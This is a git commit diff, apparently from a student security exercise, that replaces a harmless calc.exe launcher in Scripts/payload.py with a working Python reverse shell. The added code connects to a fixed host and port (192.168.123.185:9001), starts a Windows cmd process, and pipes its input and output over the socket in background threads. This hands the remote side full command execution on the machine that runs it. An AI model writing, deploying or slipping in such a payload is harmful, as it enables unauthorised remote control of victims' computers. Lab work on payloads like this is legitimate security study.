cfefe88cb305974c6d6d9401e57ced4200eb0d1a
I562291 <I562291@fontysict.nl>
2026-05-10 23:03:33 +0200

    Reverse shell script in payload

--- Scripts/payload.py
+++ Scripts/payload.py
@@ -1,11 +1,41 @@
-import subprocess 
+# import subprocess 
 
-def open_calculator():
-    try:
-        # Opens the Windows Calculator app
-        subprocess.Popen('calc.exe')
-    except Exception as e:
-        print(f"Failed to open calculator: {e}")
+# def open_calculator():
+#     try:
+#         # Opens the Windows Calculator app
+#         subprocess.Popen('calc.exe')
+#     except Exception as e:
+#         print(f"Failed to open calculator: {e}")
 
-if __name__ == "__main__":
-    open_calculator()
+# if __name__ == "__main__":
+#     open_calculator()
+
+import os,socket,subprocess,threading;
+def s2p(s, p):
+    while True:
+        data = s.recv(1024)
+        if len(data) > 0:
+            p.stdin.write(data)
+            p.stdin.flush()
+
+def p2s(s, p):
+    while True:
+        s.send(p.stdout.read(1))
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("192.168.123.185",9001))
+
+p=subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+
+s2p_thread = threading.Thread(target=s2p, args=[s, p])
+s2p_thread.daemon = True
+s2p_thread.start()
+
+p2s_thread = threading.Thread(target=p2s, args=[s, p])
+p2s_thread.daemon = True
+p2s_thread.start()
+
+try:
+    p.wait()
+except KeyboardInterrupt:
+    s.close()
